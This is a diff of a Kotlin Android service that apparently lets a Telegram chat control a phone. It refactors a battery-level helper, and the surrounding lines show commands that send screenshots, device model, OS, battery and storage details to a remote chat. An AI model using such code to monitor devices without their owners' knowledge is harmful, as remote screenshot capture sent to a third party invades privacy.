@@ -159,9 +159,8 @@ class TelegramService : Service() {
                 takeScreenshot(targetChatId)
             }
             cmd.contains("/battery") || cmd == "battery" -> {
-                getBattery { level, charging ->
-                    sendText(targetChatId, "Baterai: $level% ${if (charging) "Charging" else ""}")
-                }
+                val (level, charging) = getBattery()
+                sendText(targetChatId, "Baterai: $level% ${if (charging) "Charging" else ""}")
             }
             cmd.contains("/status") || cmd == "status" -> {
                 getDeviceStatus(targetChatId)
@@ -218,30 +217,29 @@ class TelegramService : Service() {
         } catch (e: Exception) { /* ignore */ }
     }
 
-    private suspend fun getBattery(callback: suspend (Int, Boolean) -> Unit) {
+    private suspend fun getBattery(): Pair<Int, Boolean> {
         val i = registerReceiver(null, Intent(Intent.ACTION_BATTERY_CHANGED))
-        if (i == null) { callback(0, false); return }
+        if (i == null) return Pair(0, false)
         val level = i.getIntExtra(BatteryManager.EXTRA_LEVEL, -1)
         val scale = i.getIntExtra(BatteryManager.EXTRA_SCALE, 1)
         val pct = if (level > 0 && scale > 0) level * 100 / scale else 0
         val status = i.getIntExtra(BatteryManager.EXTRA_STATUS, -1)
         val charging = status == BatteryManager.STATUS_CHARGING || status == BatteryManager.STATUS_FULL
-        callback(pct, charging)
+        return Pair(pct, charging)
     }
 
     private suspend fun getDeviceStatus(chatId: String) {
-        getBattery { level, charging ->
-            val free = filesDir.freeSpace
-            val total = filesDir.totalSpace
-            val msg = """
-                Model: ${Build.MODEL}
-                Produsen: ${Build.MANUFACTURER}
-                Android ${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})
-                Baterai: $level% ${if (charging) "Charging" else ""}
-                Storage: ${String.format("%.1f", free / 1e9)} GB / ${String.format("%.1f", total / 1e9)} GB
-            """.trimIndent()
-            sendText(chatId, msg)
-        }
+        val (level, charging) = getBattery()
+        val free = filesDir.freeSpace
+        val total = filesDir.totalSpace
+        val msg = """
+            Model: ${Build.MODEL}
+            Produsen: ${Build.MANUFACTURER}
+            Android ${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})
+            Baterai: $level% ${if (charging) "Charging" else ""}
+            Storage: ${String.format("%.1f", free / 1e9)} GB / ${String.format("%.1f", total / 1e9)} GB
+        """.trimIndent()
+        sendText(chatId, msg)
     }
 
     private suspend fun takeScreenshot(chatId: String) {
